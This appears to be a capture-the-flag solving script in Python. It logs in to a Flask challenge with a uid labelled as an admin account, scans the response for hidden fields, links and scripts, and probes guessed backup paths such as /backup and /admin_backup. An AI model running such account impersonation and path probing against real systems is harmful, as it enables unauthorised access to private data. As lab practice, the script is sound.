import requests
import re

BASE_URL = "http://8080-f38af472-f3ae-405c-9d07-9ac048a61efd.challenge.ctfplus.cn"
session = requests.Session()

print("[*] Flask 备份接口漏洞 - 仔细检查登录响应")
print(f"[*] Target: {BASE_URL}")
print()

# 登录并仔细查看响应
uid = "3553c1effa0b4698895a4874cfbd86d8"  # ADMiN

# POST 登录
login_resp = session.post(f"{BASE_URL}/login", data={"uid": uid})
print(f"[*] POST /login")
print(f"    Status: {login_resp.status_code}")

# 保存完整响应
with open("login_response_analysis.txt", "w", encoding="utf-8") as f:
    f.write(login_resp.text)
print(f"    [+] 保存到 login_response_analysis.txt")

# 提取所有信息
print(f"\n[*] 分析响应:")

# 检查是否有隐藏字段
hidden_fields = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', login_resp.text)
if hidden_fields:
    print(f"    [!] 发现隐藏字段:")
    for field in hidden_fields:
        print(f"        {field}")

# 检查是否有 disabled 按钮
disabled_buttons = re.findall(r'<button[^>]*disabled[^>]*>([^<]+)</button>', login_resp.text)
if disabled_buttons:
    print(f"    [!] 发现禁用按钮: {disabled_buttons}")
else:
    print(f"    [!!!] 没有禁用按钮! 可能是管理员!")

# 检查 backup 相关
if "backup" in login_resp.text.lower():
    print(f"    [+] 发现 backup 关键词!")

# 检查 admin 相关
if "admin" in login_resp.text.lower():
    print(f"    [!] 发现 admin 关键词!")

# 检查是否有链接
links = re.findall(r'href=["\']([^"\']+)["\']', login_resp.text)
if links:
    print(f"    [!] 链接: {links}")

# 检查是否有 onclick 事件
onclick_events = re.findall(r'onclick=["\']([^"\']+)["\']', login_resp.text)
if onclick_events:
    print(f"    [!] onclick 事件: {onclick_events}")

# 检查 JavaScript
js_code = re.findall(r'<script[^>]*>(.*?)</script>', login_resp.text, re.DOTALL)
if js_code:
    print(f"    [!] JavaScript 代码:")
    for js in js_code:
        print(f"        {js[:300]}")

print()

# 检查 /dashboard 是否有备份相关
print("[*] 测试: 检查 /dashboard")

dashboard_resp = session.get(f"{BASE_URL}/dashboard")
print(f"    /dashboard: {dashboard_resp.status_code}")

if "disabled" not in dashboard_resp.text:
    print(f"    [!!!] dashboard 没有禁用按钮!")
    print(f"    [!!!] 可能是管理员!")

print()

# 尝试访问备份
print("[*] 测试: 尝试访问备份")

backup_paths = ["/backup", "/adminbackup", "/admin_backup"]
for path in backup_paths:
    resp = session.get(f"{BASE_URL}{path}")
    if resp.status_code != 404:
        print(f"    [+] {path}: {resp.status_code}")
        print(f"    {resp.text[:500]}")

print()

print("[*] 测试完成")
